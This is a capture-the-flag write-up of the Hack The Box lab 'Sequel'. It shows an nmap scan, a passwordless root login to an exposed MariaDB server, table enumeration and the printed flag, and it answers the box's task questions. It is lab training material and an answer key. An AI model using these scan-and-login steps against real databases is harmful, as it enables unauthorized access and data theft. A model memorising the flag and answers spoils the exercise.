# Sequel

**Platform**: Hack The Box \
**Difficulty**: Very Easy\
**Date**: 2026-05-24\
**OS**: Linux\
**IP**: 10.129.14.185 

# Enumeration

Task 1
> During our scan, which port do we find serving MySQL?

`3306`

Task 2
> What community-developed MySQL version is the target running?

`MariaDB`

## Nmap

```bash
nmap -sC -sV $IP -oN recon/initial
```

```text
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-24 20:29 -0400
Nmap scan report for 10.129.14.185
Host is up (0.18s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 96
|   Capabilities flags: 63486
|   Some Capabilities: LongColumnFlag, SupportsTransactions, ConnectWithDatabase, IgnoreSigpipes, Speaks41ProtocolNew, Support41Auth, DontAllowDatabaseTableColumn, FoundRows, Speaks41ProtocolOld, InteractiveClient, ODBCClient, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, SupportsCompression, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: 1C:8LTC1i??^<OZU{-kS
|_  Auth Plugin Name: mysql_native_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 210.83 seconds
```

---

# Initial Foothold

Task 3
> When using the MySQL command line client, what switch do we need to use in order to specify a login username?
```bash
mysql -? | grep "user"
```
`-u, --user=name     User for login if not current user.`

Task 4
> Which username allows us to log into this MariaDB instance without providing a password?

Upon researching, we found username `root` allows us to login to MySQL instances without a password.

```bash
mysql -u root -h $IP
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
```

```bash
mysql -u root -h $IP --skip-ssl
```

```text
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 139
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```
Tasks 5 & 6 require us to dig through some Documentation to understand the MariaDB syntax.

Task 5
> In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?

`*`

Task 6
> In SQL, what symbol do we need to end each query with?

`;`

From here, we can start looking at the databases on the server to try and find our flag and complete the machine.

Task 7
> There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?

```text
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.158 sec)
```

Task 8
> What is the command in MySQL to select a database to interact with?

```bash
MariaDB [mysql]> use htb
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.226 sec)
```

Task 9
> What is the command in MySQL to show the different columns for a given table?

```bash
MariaDB [htb]> describe config;
+-------+---------------------+------+-----+---------+-------------
| Field | Type                | Null | Key | Default | Extra       
+-------+---------------------+------+-----+---------+-------------
| id    | bigint(20) unsigned | NO   | PRI | NULL    | auto_increme
| name  | text                | YES  |     | NULL    |             
| value | text                | YES  |     | NULL    |             
+-------+---------------------+------+-----+---------+-------------
3 rows in set (0.222 sec)
```

Task 10
> Which table has a column named "flag"?

Using `DESC` didn't produce any columns with the name "flag", so after a little research we find the command `select * from tbl_name;` allows us to view the content of the `config` table.

```bash
MariaDB [htb]> select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.165 sec)
```

---

# Flags

#### Root/Admin
```text
7b4bec00d1a39e3dd4e021ec3d915da8
```

---
